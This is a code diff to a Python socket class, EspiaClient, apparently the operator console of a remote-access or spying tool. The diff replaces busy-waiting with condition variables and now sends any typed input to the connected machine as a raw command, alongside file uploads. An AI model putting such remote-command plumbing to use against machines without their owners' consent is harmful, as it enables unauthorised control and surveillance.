@@ -1,4 +1,5 @@
 import os
+import sys
 import threading
 import socket
 class EspiaClient(threading.Thread):
@@ -11,8 +12,8 @@ class EspiaClient(threading.Thread):
         self.controller = controller        # Controller condition object (to awake, sleep it)
         self.state = threading.Condition()  # Current thread condition object (used to awake, sleep this thread)
         self.server = server                # Server object
-        self.recieving = True               # To busy-wait while recieving something
         self.final = ""                     # Buffer to add recieving data
+        self.recv_state = threading.Condition() # Lock to wait/notify till <end> of the message
 
     def run(self):
         self.recv_thread = threading.Thread(name='Reciever', target=self.recieve)
@@ -20,7 +21,6 @@ class EspiaClient(threading.Thread):
 
         self.pause()
         while (self.paused == False and self.closed == False):
-            self.recieving = True
             self.final = ""
             input_text = input("%s:%s >> " % (self.client_info[0], self.client_info[1]))
             parameters = input_text.split(" ")
@@ -37,24 +37,29 @@ class EspiaClient(threading.Thread):
                 self.connection.send(command.encode())
             elif (command == "exit"):
                 self.close() 
+                continue
             elif (command == "wait"):
                 self.pause()
+                continue
             elif (command == "upload"):
                 f = open(parameters[0], "rb")
                 text = f.read()
                 size = len(text)
-                #msg = "asdfasdfasdfasdfasdfjlkasdfl;kasdfjlk;asdfjklasdflkasdfjklasdflk;asdflk;asdflk;asdflk;asdflk;"
                 self.connection.send(("upload " + parameters[0]).encode())
                 self.connection.send(("%s" % (size)).encode())
-                while (self.recieving):
-                    pass
+                with self.recv_state:
+                    self.recv_state.wait()
                 self.connection.sendall(text)
                 continue
-            else:
-                continue
-            
-            while (self.recieving):
+            elif (command == ""):
                 pass
+            else:
+                msg = input_text.encode("utf8")
+                print(msg)
+                self.connection.send(msg)
+            
+            with self.recv_state:
+                self.recv_state.wait()
             print(self.final)
         return
     
@@ -62,10 +67,11 @@ class EspiaClient(threading.Thread):
     def recieve(self):
         while True:
             try:
-                recv_buff = self.connection.recv(1024).decode()
+                recv_buff = self.connection.recv(1024).decode("utf8")
                 if (recv_buff[-12::2][:5] == "<end>"):              # For some reason, '<end>' that is in recv_buff will be actually ['<','','e','','n','','d','','>'] so normal comparison won't work, so those '' need to be removed
                     self.final += recv_buff[0:-12]
-                    self.recieving = False
+                    with self.recv_state:
+                        self.recv_state.notify()
                 else:
                     self.final += recv_buff
             except ConnectionResetError:
@@ -75,7 +81,8 @@ class EspiaClient(threading.Thread):
 
     # Closes the connection socket, clears thread data
     def close(self):
-        self.recieving = False
+        with self.recv_state:
+            self.recv_state.notify()
         self.closed = True
         try:
             self.connection.shutdown(socket.SHUT_RDWR)    # Try closing the both ends of the connection to exit from recieve() function thread
@@ -90,7 +97,6 @@ class EspiaClient(threading.Thread):
 
     # Pauses the current thread (Awake the controller and pause)
     def pause(self):
-        self.recieving = False
         with self.state:
             with self.controller:                      # Notify the controller to awake
                 self.controller.notify()
